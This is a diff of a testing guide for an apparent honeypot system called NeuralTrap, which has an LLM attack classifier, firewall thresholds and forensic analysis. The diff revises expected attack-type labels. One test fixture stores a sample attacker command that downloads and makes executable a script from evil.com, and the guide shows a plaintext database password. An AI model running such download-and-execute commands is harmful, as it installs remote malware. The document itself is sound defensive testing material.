@@ -54,15 +54,15 @@ python3 llm_classifier.py
 
 **Expected results (scores are dynamic, not fixed):**
 
-| Test | Expected attack_type | Approximate score range |
-|------|---------------------|------------------------|
-| TEST 1 — Ransomware | `Ransomware Deployment` | 0.75 – 1.0 |
-| TEST 2 — Recon | `Reconnaissance` | 0.05 – 0.35 |
-| TEST 3 — Data Exfil | `Data Exfiltration` | 0.5 – 0.9 |
-| TEST 4 — Brute Force | `Brute Force` | 0.3 – 0.9 |
+| Test | Expected attack_type (Dynamic) | Approximate score range |
+|------|-------------------------------|------------------------|
+| TEST 1 — Ransomware | E.g. `Cryptomining` or `Ransomware` | 0.75 – 1.0 |
+| TEST 2 — Recon | E.g. `Reconnaissance` or `Scanning` | 0.05 – 0.35 |
+| TEST 3 — Data Exfil | E.g. `Data Exfiltration` or `Theft` | 0.5 – 0.9 |
+| TEST 4 — Brute Force | E.g. `Brute Force` or `Lateral Movement` | 0.3 – 0.9 |
 
 > [!NOTE]
-> Scores are determined dynamically by the LLM — exact values vary between runs, but relative ordering should hold (Ransomware > Data Exfil > Brute Force > Recon).
+> Attack types and scores are determined dynamically by the LLM based on its own analysis — exact values vary between runs, but relative ordering should hold (Ransomware > Data Exfil > Brute Force > Recon).
 
 ### Real-World Attack Sequence Tests
 
@@ -327,8 +327,8 @@ python3 firewall.py
 # Test threshold logic
 python3 -c "
 from firewall import check_and_block
-check_and_block('test-001', '127.0.0.1', 'Reconnaissance', 0.40)
-check_and_block('test-002', '127.0.0.1', 'Ransomware Deployment', 0.95)
+check_and_block('test-001', '127.0.0.1', 'Suspicious Recon', 0.40)
+check_and_block('test-002', '127.0.0.1', 'Cryptomining', 0.95)
 "
 
 # Verify in DB
@@ -345,7 +345,7 @@ mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "SELECT * FROM blocked_ips;"
 ```bash
 mysql -u neuraltrap -pneuraltrap123 neuraltrap -e "
 INSERT IGNORE INTO labeled_sessions (session_id, src_ip, commands, attack_type, threat_score)
-VALUES ('test-forensic', '10.0.0.99', 'whoami wget http://evil.com/malware.sh chmod +x ./malware.sh', 'Ransomware Deployment', 0.95);
+VALUES ('test-forensic', '10.0.0.99', 'whoami wget http://evil.com/malware.sh chmod +x ./malware.sh', 'Cryptomining', 0.95);
 "
 
 python3 forensic_analyst.py
